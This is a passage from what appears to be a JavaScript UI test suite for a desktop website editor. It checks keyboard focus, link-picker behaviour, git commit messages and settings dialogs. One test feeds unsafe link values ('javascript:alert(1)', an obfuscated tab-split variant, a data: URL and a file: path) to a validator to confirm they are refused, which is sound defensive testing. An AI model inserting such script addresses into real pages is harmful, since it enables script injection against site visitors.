      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "FindReplaceModal.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "findResultKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      const css = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const rule = css.match(/\.find-replace-page\s*\{([^}]+)\}/)?.[1] ?? "";
      record(
        "find results move with the arrow keys without opening a page",
        down === quote &&
          downAgain === about &&
          up === quote &&
          toStart === home &&
          end === about &&
          edge === null &&
          ignore === null &&
          move.defaultPrevented === true &&
          focused &&
          oneStop &&
          scrolled &&
          moveEnd.defaultPrevented === true &&
          endFocused &&
          endStop &&
          endScrolled &&
          opens === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.includes("onFindResultKeyDown") &&
          source.includes("tabIndex={index() === 0 ? 0 : -1}") &&
          !keyboard.includes(".click(") &&
          /min-height:\s*24px/.test(rule) &&
          help.includes("Move between find results when that list is focused"),
        `down=${down === quote} focused=${focused} oneStop=${oneStop} endFocused=${endFocused} scroll=${scroller.scrollTop} opens=${opens} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      scroller.remove();
    } catch (error) {
      record(
        "find results move with the arrow keys without opening a page",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Changing the link type used to rebuild the dialog, so the keyboard left
  // the type list after one arrow and a typed address was easy to lose.
  {
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/LinkPickerModal.tsx")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLSelectElement: dom.window.HTMLSelectElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const picker = mod.exports;
      const doc = dom.window.document;
      const host = doc.createElement("div");
      doc.body.append(host);
      let kind = "page";
      let raw = "";
      let edited = false;
      const dispose = picker.renderLinkPickerModal(host, {
        kind: "page",
        pageOptions: [{ value: "/about", label: "About (/about)" }],
        pageValue: "/about",
        rawValue: "",
        currentValue: "https://example.com/docs",
        onKindChange: (value) => {
          kind = value;
        },
        onPageValueChange: () => {},
        onRawValueChange: (value, wasEdited) => {
          raw = value;
          if (wasEdited) edited = true;
        },
      });
      const select = host.querySelector(".link-kind");
      select.focus();
      select.value = "url";
      select.dispatchEvent(new dom.window.Event("change", { bubbles: true }));
      const input = host.querySelector("input.text");
      const stayed =
        select.isConnected &&
        doc.activeElement === select &&
        select.value === "url" &&
        kind === "url" &&
        input instanceof dom.window.HTMLInputElement &&
        input.value === "https://example.com/docs" &&
        raw === "https://example.com/docs" &&
        edited === false;
      input.focus();
      input.value = "https://kept.example";
      input.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      select.focus();
      select.value = "email";
      select.dispatchEvent(new dom.window.Event("change", { bubbles: true }));
      const kept =
        select.isConnected &&
        doc.activeElement === select &&
        host.querySelector("input.text").value === "https://kept.example" &&
        edited === true &&
        raw === "https://kept.example";
      dispose();
      host.remove();
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const start = engine.indexOf("onKindChange: (value) => {");
      const kindChange = engine.slice(
        start,
        engine.indexOf("onPageValueChange:", start),
      );
      record(
        "link type keeps focus and a typed address",
        stayed &&
          kept &&
          start !== -1 &&
          !kindChange.includes("renderModal(") &&
          engine.includes("currentValue: current"),
        `stayed=${stayed} kept=${kept} kind=${kind} raw=${raw} edited=${edited} active=${doc.activeElement && doc.activeElement.className}`,
      );
    } catch (error) {
      record(
        "link type keeps focus and a typed address",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Use Link used to store a javascript: address and close. The dialog has to
  // stay open, keep the address, and say the link type is not allowed.
  {
    let host = null;
    try {
      const commit = compileRendererHelper("src/renderer/linkPickerCommit.ts");
      const blocked = (value) =>
        commit.linkPickerProblem(value) === "That link type is not allowed.";
      const https = commit.linkPickerHref({
        kind: "url",
        pageValue: "",
        rawValue: "https://kept.example",
        rawEdited: true,
        current: "",
      });
      const cleared = commit.linkPickerHref({
        kind: "url",
        pageValue: "",
        rawValue: "   ",
        rawEdited: true,
        current: "javascript:alert(1)",
      });
      const mailto = commit.linkPickerHref({
        kind: "email",
        pageValue: "",
        rawValue: "a@b.com",
        rawEdited: true,
        current: "",
      });
      const page = commit.linkPickerHref({
        kind: "page",
        pageValue: "/about",
        rawValue: "",
        rawEdited: false,
        current: "",
      });
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/LinkPickerModal.tsx")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLSelectElement: dom.window.HTMLSelectElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      host = dom.window.document.createElement("div");
      dom.window.document.body.append(host);
      const dispose = mod.exports.renderLinkPickerModal(host, {
        kind: "url",
        pageOptions: [],
        pageValue: "",
        rawValue: "javascript:alert(1)",
        currentValue: "",
        formError: "That link type is not allowed.",
        onKindChange() {},
        onPageValueChange() {},
        onRawValueChange() {},
      });
      const alert = host.querySelector(".link-picker-error");
      const input = host.querySelector("input.text");
      const shown =
        !!alert &&
        alert.getAttribute("role") === "alert" &&
        alert.textContent === "That link type is not allowed." &&
        input.value === "javascript:alert(1)";
      dispose();
      host.remove();
      host = null;
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const useStart = engine.indexOf('label: "Use Link"');
      const useLink = engine.slice(
        useStart,
        engine.indexOf("registerCleanup(() => {", useStart),
      );
      const staysOpen =
        useStart !== -1 &&
        useLink.includes("linkPickerProblem(href)") &&
        useLink.includes("modalState.formError = problem") &&
        useLink.indexOf("return;") !== -1 &&
        useLink.indexOf("return;") < useLink.indexOf("closeModal()") &&
        useLink.includes("onPick(href)");
      record(
        "choose link refuses a script address",
        blocked("javascript:alert(1)") &&
          blocked("java\tscript:alert(1)") &&
          blocked("data:text/html,x") &&
          blocked("file:///c/windows") &&
          commit.linkPickerProblem("") === "" &&
          https === "https://kept.example" &&
          commit.linkPickerProblem(https) === "" &&
          cleared === "" &&
          mailto === "mailto:a@b.com" &&
          page === "/about" &&
          shown &&
          staysOpen,
        `https=${https} cleared=${cleared} shown=${shown} stays=${staysOpen}`,
      );
    } catch (error) {
      if (host) host.remove();
      record(
        "choose link refuses a script address",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Section and block grips are pointer drag handles. They sit in front of
  // the move buttons, and the section grip is invisible until focused, so a
  // keyboard user landed on a control that cannot reorder anything.
  {
    try {
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "CanvasView.tsx"),
        "utf8",
      );
      const css = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const grip = (className) => {
        const at = source.indexOf(`class="${className}"`);
        const open = source.lastIndexOf("<button", at);
        const close = source.indexOf("</button>", at);
        return at === -1 || open === -1 || close === -1
          ? ""
          : source.slice(open, close);
      };
      const section = grip("section-grip");
      const block = grip("block-grip");
      const hidden = css.match(/\.section-grip\s*\{([^}]+)\}/)?.[1] ?? "";
      record(
        "reorder grips stay out of the tab order",
        section.includes("tabIndex={-1}") &&
          block.includes("tabIndex={-1}") &&
          section.includes("onDragStart=") &&
          block.includes("onDragStart=") &&
          section.includes("Move section up") === false &&
          /opacity:\s*0/.test(hidden) &&
          /pointer-events:\s*none/.test(hidden) &&
          source.includes('label="Move section up"') &&
          source.includes('label="Move block up"'),
        `section=${section.includes("tabIndex={-1}")} block=${block.includes("tabIndex={-1}")}`,
      );
    } catch (error) {
      record(
        "reorder grips stay out of the tab order",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Picking a link, a favicon, or a 404 slug rebuilds the dialog. The modal
  // restore timer was landing on the first field, so the keyboard left the
  // address the user had just set. An invalid site URL has to do the same.
  {
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const buildModal = async (entry) => {
        const out = await esbuild.build({
          entryPoints: [path.join(ROOT, entry)],
          bundle: true,
          write: false,
          format: "cjs",
          platform: "browser",
          target: "es2020",
          plugins: [solidPlugin()],
        });
        const mod = { exports: {} };
        const sandbox = {
          module: mod,
          exports: mod.exports,
          require,
          console,
          window: dom.window,
          document: dom.window.document,
          HTMLElement: dom.window.HTMLElement,
          HTMLInputElement: dom.window.HTMLInputElement,
          HTMLButtonElement: dom.window.HTMLButtonElement,
          Node: dom.window.Node,
          setTimeout: dom.window.setTimeout.bind(dom.window),
          clearTimeout: dom.window.clearTimeout.bind(dom.window),
          queueMicrotask,
          requestAnimationFrame: (callback) => {
            callback(0);
            return 0;
          },
          cancelAnimationFrame() {},
        };
        vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
        return mod.exports;
      };
      const siteEditor = await buildModal("src/renderer/editorSiteEditor.ts");
      const doc = dom.window.document;
      const site = {
        siteUrl: "",
        language: "en",
        faviconPath: "",
        siteName: "My Site",
        shell: {
          siteTitle: "My Site",
          logoText: "",
          announcementText: "",
          announcementVisible: false,
          navCtaLabel: "Start",
          navCtaHref: "/start",
          footerHtml: "",
          customHeadHtml: "",
          layoutMode: "managed",
        },
        design: {
          accent: "#7c3aed",
          background: "#ffffff",
          foreground: "#111111",
          surface: "#fafafa",
          fontFamily: "system-ui",
          headingFontFamily: "system-ui",
          radius: "12px",
          containerWidth: "960px",
          shadow: "md",
          fontImportUrl: "",
        },
      };
      let content = null;
      let shellActions = [];
      const stealFirst = () => {
        const first = content.querySelector("input");
        setTimeout(() => first.focus(), 0);
      };
      const shell = siteEditor.createSiteEditorActions({
        getState: () => ({
          project: { path: "C:/site", astro: { pagesDir: "src/pages" } },
          siteDocument: site,
          pendingSiteDocument: null,
        }),
        setStatus() {},
        closeModal() {},
        showModalNode(_title, node, actions) {
          content = node;
          shellActions = actions;
          doc.body.append(node);
        },
        registerCleanup() {},
        modalController: { confirmDestructive: async () => true },
        resolveSiteEditorConflict: async () => true,
        writeSiteDocumentFromRenderer: async () => {
          throw new Error("invalid site URL was staged");
        },
        openLinkPicker(_current, onPick) {
          stealFirst();
          onPick("/pricing");
        },
        openAssetBrowser(options) {
          stealFirst();
          options.onSelect("/assets/images/icon.png");
        },
        buildFontImportUrl: () => "",
        googleFontForStack: () => null,
      });
      await shell.openSiteShellModal();
      const choose = (selector) => {
        content
          .querySelector(selector)
          .parentElement.querySelector("button")
          .click();
      };
      choose(".shell-cta-href");
      await new Promise((resolve) => setTimeout(resolve, 0));
      const cta = content.querySelector(".shell-cta-href");
      const ctaKept = doc.activeElement === cta && cta.value === "/pricing";
      choose(".shell-favicon");
      await new Promise((resolve) => setTimeout(resolve, 0));
      const favicon = content.querySelector(".shell-favicon");
      const faviconKept =
        doc.activeElement === favicon &&
        favicon.value === "/assets/images/icon.png";
      const url = content.querySelector(".shell-site-url");
      url.value = "notaurl";
      url.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const stage = shellActions.find(
        (action) => action.label === "Stage Shell",
      );
      await stage.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const urlNow = content.querySelector(".shell-site-url");
      const urlKept =
        doc.activeElement === urlNow &&
        (content.textContent || "").includes(
          "Site URL must be a full http(s) address",
        );
      content.remove();

      const pages = await buildModal("src/renderer/editorPageModals.ts");
      dom.window.zephus = {
        readPageMeta: async () => ({
          title: "About",
          slug: "about",
          navLabel: "About",
          metaDescription: "",
          navVisible: true,
          socialImage: "",
          canonicalUrl: "",
          noindex: false,
          publishDate: "",
          author: "",
          isHome: false,
          route: "/about",
        }),
        readPageDocument: async () => ({ ok: false }),
      };
      const pageActions = pages.createPageModalActions({
        getState: () => ({
          project: { path: "C:/site", astro: { pagesDir: "src/pages" } },
          siteDocument: null,
          pendingSiteDocument: null,
        }),
        setStatus() {},
        closeModal() {},
        registerCleanup() {},
        refreshIcons() {},
        modalController: { confirmDestructive: async () => false },
        maybeResolveUnsavedWork: async () => true,
        reloadPages: async () => {},
        loadPage: async () => {},
        getCode: () => "",
        syncCurrentMeta() {},
        resetOpenPageState() {},
        normalizePageSlugInput: (value) => value,
        isReservedNotFoundSlug: (slug) =>
          slug === "404" || slug.startsWith("404/"),
        invalidateAssetCache() {},
        fetchAssetDataUrl: async () => null,
        reloadSiteDocumentFromDisk: async () => {},
        showModalNode(_title, node) {
          content = node;
          doc.body.append(node);
        },
        editorSaveWaitForIdle: async () => {},
        editorSaveIsSaving: () => false,
        patchOpenPageLayoutTitle() {},
        pageDraftContent: () => "",
      });
      await pageActions.openPageMetaModal("src/pages/about.astro");
      const slug = content.querySelector(".page-slug");
      slug.focus();
      slug.value = "404";
      slug.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      await new Promise((resolve) => setTimeout(resolve, 0));
      const slugNow = content.querySelector(".page-slug");
      const slugKept =
        slug !== slugNow &&
        !slug.isConnected &&
        doc.activeElement === slugNow &&
        slugNow.value === "404" &&
        (content.textContent || "").includes(
          "The 404 page is always hidden from site navigation.",
        );
      const pageSource = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorPageModals.ts"),
        "utf8",
      );
      content.remove();
      record(
        "rebuilt dialogs keep focus on the field that changed",
        ctaKept &&
          faviconKept &&
          urlKept &&
          slugKept &&
          pageSource.includes('focusModalField(wrap, ".page-social-image")'),
        `cta=${ctaKept} favicon=${faviconKept} url=${urlKept} slug=${slugKept} active=${doc.activeElement && doc.activeElement.className}`,
      );
    } catch (error) {
      record(
        "rebuilt dialogs keep focus on the field that changed",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A failed commit used to clear the message anyway. The words the user
  // typed have to stay until git actually accepts them.
  {
    try {
      const gitActions = compileRendererHelper("src/renderer/editorGit.ts");
      const failedActions = gitActions.createEditorGitActions({
        getProjectPath: () => "C:/site",
        setStatus() {},
        setGitStatus() {},
        zephus: {
          getGitStatus: async () => ({
            available: true,
            detachedHead: false,
            branch: "main",
            modified: [],
            added: [],
            deleted: [],
          }),
          commitGitChanges: async () => ({
            ok: false,
            error: "nothing to commit",
          }),
          pushGitChanges: async () => ({ ok: true }),
          pullGitChanges: async () => ({ ok: true }),
          initGitRepo: async () => ({ ok: true }),
        },
      });
      const keptByGit =
        (await failedActions.commitGitChanges("Keep this message")) === false;
      const landedActions = gitActions.createEditorGitActions({
        getProjectPath: () => "C:/site",
        setStatus() {},
        setGitStatus() {},
        zephus: {
          getGitStatus: async () => ({
            available: true,
            detachedHead: false,
            branch: "main",
            modified: [],
            added: [],
            deleted: [],
          }),
          commitGitChanges: async () => ({ ok: true }),
          pushGitChanges: async () => ({ ok: true }),
          pullGitChanges: async () => ({ ok: true }),
          initGitRepo: async () => ({ ok: true }),
        },
      });
      const clearedByGit =
        (await landedActions.commitGitChanges("Landed")) === true;
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/GitPanel.tsx")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLTextAreaElement: dom.window.HTMLTextAreaElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const git = mod.exports;
      const doc = dom.window.document;
      const host = doc.createElement("div");
      doc.body.append(host);
      let attempts = 0;
      git.registerGitPanelHandlers({
        onRefresh() {},
        onCommit: async () => {
          attempts += 1;
          return attempts > 1;
        },
        onPush() {},
        onPull() {},
        onInitRepo() {},
      });
      git.updateGitStatus({
        available: true,
        detachedHead: false,
        branch: "main",
        hasRemote: false,
        modified: ["src/pages/index.astro"],
        added: [],
        deleted: [],
      });
      git.mountGitPanel(host);
      await new Promise((resolve) => setTimeout(resolve, 0));
      const message = host.querySelector("textarea");
      message.focus();
      message.value = "Fix the header";
      message.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const commitButton = () =>
        [...host.querySelectorAll("button")].find((button) =>
          (button.textContent || "").includes("Commit"),
        );
      commitButton().click();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const kept = host.querySelector("textarea").value === "Fix the header";
      commitButton().click();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const cleared = host.querySelector("textarea").value === "";
      host.remove();
      record(
        "a failed commit keeps the message",
        keptByGit && clearedByGit && kept && cleared && attempts === 2,
        `git=${keptByGit}/${clearedByGit} panel=${kept}/${cleared} attempts=${attempts} enabled=${commitButton() && !commitButton().disabled}`,
      );
    } catch (error) {
      record(
        "a failed commit keeps the message",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Choosing a Node.js location or checking for updates rebuilds Settings.
  // The button that was used has to keep the keyboard, including when that
  // button is replaced by the next update action.
  {
    let finish = () => {};
    let reportedRebuild = false;
    let reportedSettingsSave = false;
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorSettingsModal.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLSelectElement: dom.window.HTMLSelectElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const settingsModal = mod.exports;
      const doc = dom.window.document;
      let updaterActions = [
        { id: "check", label: "Check for Updates", tone: "secondary" },
      ];
      let opened = null;
      let settingsActions = [];
      let settingsWrite = { ok: true };
      finish = () => {
        if (opened) opened.remove();
        delete dom.window.zephus;
      };
      dom.window.zephus = {
        readGlobalSettings: async () => ({
          theme: "dark",
          codeFontSize: 13,
          recentProjects: [],
          autoCheckUpdates: true,
          updateChannel: "auto",
          restoreLastProject: false,
          confirmBlockDelete: true,
          autosave: false,
          customNodePath: "C:/node.exe",
        }),
        writeGlobalSettings: async () => settingsWrite,
        getNodeStatus: async () => ({ status: "ok", version: "22.12.0" }),
        getAppVersion: async () => "1.0.0",
        checkForUpdates: async () => {
          updaterActions = [
            { id: "download", label: "Download", tone: "primary" },
          ];
          return { status: "available" };
        },
        downloadUpdate: async () => ({ status: "downloaded" }),
        cancelUpdateDownload: async () => undefined,
        openConfigFolder: async () => ({ ok: true }),
        pickNodePath: async () => ({
          status: "ok",
          version: "22.12.0",
          usedCustomPath: true,
          binaryPath: "C:/node.exe",
        }),
        setNodePath: async () => ({ status: "ok", version: "22.12.0" }),
        openProductionLicensesFile: async () => ({ ok: true }),
        readProductionLicenses: async () => ({ ok: true, entries: [] }),
      };
      const actions = settingsModal.createSettingsModalActions({
        $: () => doc.body,
        setStatus() {},
        showModal(_title, _body) {},
        showModalNode(_title, content, nextActions) {
          opened = content;
          settingsActions = nextActions;
          doc.body.append(content);
        },
        closeModal() {},
        registerCleanup() {},
        modalController: {
          confirmDestructive: async () => false,
          isOpen: () => true,
        },
        applyCodeFontSize() {},
        nodeStatusMessage: (res) =>
          res && res.status === "ok"
            ? `Node.js ${res.version} detected`
            : "missing",
        friendlyError: (raw) => raw || "unknown",
        updaterStatusMessage: () => "Update available",
        currentUpdaterActions: () => updaterActions,
        restartToApplyUpdate: async () => undefined,
        setAppSettings() {},
        getAppSettings: () => null,
      });
      await actions.openSettingsModal();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const autoBefore = opened.querySelector(".settings-node-auto");
      autoBefore.click();
      await new Promise((resolve) => setTimeout(resolve, 0));
      await new Promise((resolve) => setTimeout(resolve, 0));
      const browseAfterAuto = opened.querySelector(".settings-node-browse");
      const autoAfter = opened.querySelector(".settings-node-auto");
      const autoKept =
        autoBefore !== autoAfter &&
        autoAfter.disabled === true &&
        doc.activeElement === browseAfterAuto;
      browseAfterAuto.click();
      await new Promise((resolve) => setTimeout(resolve, 0));
      await new Promise((resolve) => setTimeout(resolve, 0));
      const browseAfterPick = opened.querySelector(".settings-node-browse");
      const browseKept =
        browseAfterPick !== browseAfterAuto &&
        !browseAfterPick.disabled &&
        doc.activeElement === browseAfterPick;
      const check = opened.querySelector(
        ".settings-updater-action[data-updater-action='check']",
      );
      check.click();
      await new Promise((resolve) => setTimeout(resolve, 0));
      await new Promise((resolve) => setTimeout(resolve, 0));
      const download = opened.querySelector(
        ".settings-updater-action[data-updater-action='download']",
      );
      const updateKept =
        check !== download &&
        !check.isConnected &&
        doc.activeElement === download;
      reportedRebuild = true;
      record(
        "settings rebuild keeps the button that was used",
        autoKept && browseKept && updateKept,
        `auto=${autoKept} browse=${browseKept} update=${updateKept} active=${doc.activeElement && doc.activeElement.className}`,
      );
      settingsWrite = { ok: false, error: "disk" };
      const save = settingsActions.find((action) => action.label === "Save");
      await save.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const saveAlert = opened.querySelector(".settings-error");
      const theme = opened.querySelector("#set-theme-modal");
      const saveShown =
        !!saveAlert &&
        saveAlert.getAttribute("role") === "alert" &&
        saveAlert.textContent === "Settings could not be saved: disk" &&
        doc.activeElement === theme;
      theme.focus();
      theme.value = "light";
      theme.dispatchEvent(new dom.window.Event("change", { bubbles: true }));
      const saveCleared =
        !opened.querySelector(".settings-error") && doc.activeElement === theme;
      reportedSettingsSave = true;
      record(
        "settings save failure stays in the dialog",
        saveShown && saveCleared,
        `shown=${saveShown} cleared=${saveCleared} alert=${saveAlert && saveAlert.textContent} active=${doc.activeElement && doc.activeElement.id}`,
      );
      finish();
    } catch (error) {
      finish();
      if (!reportedRebuild) {
        record(
          "settings rebuild keeps the button that was used",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedSettingsSave) {
        record(
          "settings save failure stays in the dialog",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
    }
  }

  // Changing columns, a post-list toggle, or clearing an image rebuilds the
  // inspector. The control that changed has to keep the keyboard.
  {
    let panel = null;
    let outside = null;
    try {
      const inspector = compileRendererHelper(
        "src/renderer/editorInspector.ts",
      );
      const doc = dom.window.document;
      panel = doc.createElement("div");
      panel.id = "properties";
      doc.body.append(panel);
      const makeSelect = (value) => {
        const label = doc.createElement("label");
        const span = doc.createElement("span");
        span.textContent = "Columns";
        const select = doc.createElement("select");
        for (const optionValue of ["2", "3", "4"]) {
          const option = doc.createElement("option");
          option.value = optionValue;
          option.textContent = optionValue;
          select.append(option);
        }
        select.value = value;
        label.append(span, select);
        return select;
      };
      const select = makeSelect("2");
      panel.append(select.parentElement);
      select.focus();
      inspector.rerenderInspectorKeepingFocus(panel, () => {
        panel.innerHTML = "";
        panel.append(makeSelect("3").parentElement);
      });
      const rebuilt = panel.querySelector("select");
      const columnsKept =
        select !== rebuilt &&
        !select.isConnected &&
        doc.activeElement === rebuilt &&
        rebuilt.value === "3";
      panel.innerHTML = "";
      const choose = doc.createElement("button");
      choose.type = "button";
      choose.textContent = "Choose Image";
      const remove = doc.createElement("button");
      remove.type = "button";
      remove.textContent = "Remove";
      panel.append(choose, remove);
      remove.focus();
      inspector.rerenderInspectorKeepingFocus(panel, () => {
        panel.innerHTML = "";
        const nextChoose = doc.createElement("button");
        nextChoose.type = "button";
        nextChoose.textContent = "Choose Image";
        const nextRemove = doc.createElement("button");
        nextRemove.type = "button";
        nextRemove.textContent = "Remove";
        nextRemove.disabled = true;
        panel.append(nextChoose, nextRemove);
      });
      const chooseNow = [...panel.querySelectorAll("button")].find((button) =>
        (button.textContent || "").includes("Choose Image"),
      );
      const removeNow = [...panel.querySelectorAll("button")].find((button) =>
        (button.textContent || "").includes("Remove"),
      );
      const imageKept =
        remove !== removeNow &&
        removeNow.disabled === true &&
        doc.activeElement === chooseNow;
      outside = doc.createElement("button");
      outside.type = "button";
      outside.textContent = "Outside";
      doc.body.append(outside);
      outside.focus();
      inspector.rerenderInspectorKeepingFocus(panel, () => {
        panel.innerHTML = "";
        panel.append(makeSelect("2").parentElement);
      });
      const outsideKept = doc.activeElement === outside;
      const ops = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorBlockOps.ts"),
        "utf8",
      );
      const start = ops.indexOf("function commitInspectorChange");
      const end = ops.indexOf("function addSectionAt");
      const commit = start >= 0 && end > start ? ops.slice(start, end) : "";
      const wired = commit.includes(
        "rerenderInspectorKeepingFocus(panel, renderProperties)",
      );
      panel.remove();
      outside.remove();
      panel = null;
      outside = null;
      record(
        "inspector rebuild keeps the control that changed",
        columnsKept && imageKept && outsideKept && wired,
        `columns=${columnsKept} image=${imageKept} outside=${outsideKept} wired=${wired} active=${doc.activeElement && doc.activeElement.textContent}`,
      );
    } catch (error) {
      if (panel) panel.remove();
      if (outside) outside.remove();
      record(
        "inspector rebuild keeps the control that changed",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Moving or removing a gallery image rebuilds the inspector. The keyboard
  // lands on that image, not on the row that inherited its old label, and an
  // empty gallery lands on Add Image.
  {
    let panel = null;
    try {
      const inspector = compileRendererHelper(
        "src/renderer/editorInspector.ts",
      );
      const doc = dom.window.document;
      panel = doc.createElement("div");
      panel.id = "properties";
      doc.body.append(panel);
      const button = (label, disabled) => {
        const el = doc.createElement("button");
        el.type = "button";
        el.setAttribute("aria-label", label);
        el.textContent = label;
        el.disabled = disabled;
        return el;
      };
      const row = (n, upDisabled, downDisabled) => [
        button(`Move image ${n} up`, upDisabled),
        button(`Move image ${n} down`, downDisabled),
        button(`Remove image ${n}`, false),
      ];
      const add = () => {
        const el = doc.createElement("button");
        el.type = "button";
        el.textContent = "Add Image from Assets";
        return el;
      };
      panel.append(add(), ...row(1, true, false), ...row(2, false, false));
      const moved = [...panel.querySelectorAll("button")].find(
        (el) => el.getAttribute("aria-label") === "Move image 2 up",
      );
      moved.focus();
      inspector.rerenderInspectorKeepingFocus(panel, () => {
        panel.replaceChildren(
          add(),
          ...row(1, true, false),
          ...row(2, false, true),
        );
      });
      const inherited =
        doc.activeElement &&
        doc.activeElement.getAttribute("aria-label") === "Move image 2 up";
      inspector.focusGalleryImageControl(panel, 0, "up");
      const movedLanded =
        doc.activeElement &&
        doc.activeElement.getAttribute("aria-label") === "Move image 1 down";
      inspector.focusGalleryImageControl(panel, 0, "remove");
      const removedLanded =
        doc.activeElement &&
        doc.activeElement.getAttribute("aria-label") === "Remove image 1";
      inspector.focusGalleryImageControl(panel, -1, "remove");
      const addLanded =
        doc.activeElement &&
        (doc.activeElement.textContent || "").includes("Add Image");
      const canvas = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorCanvas.ts"),
        "utf8",
      );
      const ops = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorBlockOps.ts"),
        "utf8",
      );
      const blockStart = ops.indexOf("function commitBlockChange");
      const blockEnd = ops.indexOf("function commitInspectorChange");
      const blockCommit =
        blockStart >= 0 && blockEnd > blockStart
          ? ops.slice(blockStart, blockEnd)
          : "";
      const wired =
        canvas.includes('from > to ? "up" : "down"') &&
        canvas.includes("Math.min(index, images.length - 1)") &&
        blockCommit.includes(
          "rerenderInspectorKeepingFocus(panel, renderProperties)",
        );
      panel.remove();
      panel = null;
      record(
        "gallery image keeps a control after it moves",
        inherited && movedLanded && removedLanded && addLanded && wired,
        `inherited=${inherited} moved=${movedLanded} removed=${removedLanded} add=${addLanded} wired=${wired} active=${doc.activeElement && doc.activeElement.getAttribute("aria-label")}`,
      );
    } catch (error) {
      if (panel) panel.remove();
      record(
        "gallery image keeps a control after it moves",
        false,
